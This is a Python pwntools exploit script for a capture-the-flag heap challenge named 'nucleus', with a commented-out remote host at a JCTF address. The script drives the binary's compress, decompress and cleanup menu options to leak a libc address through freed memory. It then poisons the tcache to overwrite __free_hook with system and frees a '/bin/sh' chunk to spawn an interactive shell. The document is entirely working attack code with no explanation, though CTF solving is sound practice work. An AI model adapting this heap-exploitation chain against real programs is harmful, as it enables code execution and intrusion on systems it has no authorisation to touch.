from pwn import *

# Set up pwntools for the correct architecture
exe = "./nucleus"
context.binary = elf = ELF(exe)
context.log_level = "debug"
libc = ELF("libc.so.6")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    set max-visualize-chunk-size 0x500
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

dc = -1
cc = -1
def compress(text):
    ru(b"> ")
    sl(b"1")
    if(len(text) < 1023):
        text += b"\n"
    ru(b"Enter text: ")
    s(text)
    ru(b"\n\n")
    global cc
    cc += 1
    return cc

def decompress(text):
    ru(b"> ")
    sl(b"2")
    if(len(text) < 1023):
        text += b"\n"
    ru(b"Enter compressed text: ")
    s(text)
    ru(b"\n\n")
    global dc
    dc += 1
    return dc

def cleanup(typ, ind):
    ru(b"> ")
    sl(b"3")
    sla(b"Compress or decompress slot? (c/d):", typ)
    sl(str(ind).encode())

def show(ind):
    ru(b"> ")
    sl(b"5")
    sl(str(ind).encode())
    ru(b"content: ")
    return(re(6))

r = start()
# r = remote("nucleus.nc.jctf.pro", 1337)

compress(b"A"*1000)
q = compress(b"X"*(int)(0x28/2))
cleanup(b"c", 0)
libc.address = u64(show(0).strip().ljust(8, b"\x00")) - 1780704 - 237568
log.info(f"libc: {hex(libc.address)}")

e = compress(b"R"*(int)(0x28/2))
w = compress(b"P"*(int)(0x28/2))

cleanup(b"c", q)
cleanup(b"c", w)
cleanup(b"c", e)

decompress(b"$40A" + p64(0x31) + p64(libc.sym.__free_hook))
compress(b"A"*20)
compress(p64(libc.sym.system) + b"A"*(20-8)) #libc.address+285984
e = compress(b"/bin/sh;\x00")

#triggering free
pause()
cleanup(b"c", e)

r.interactive()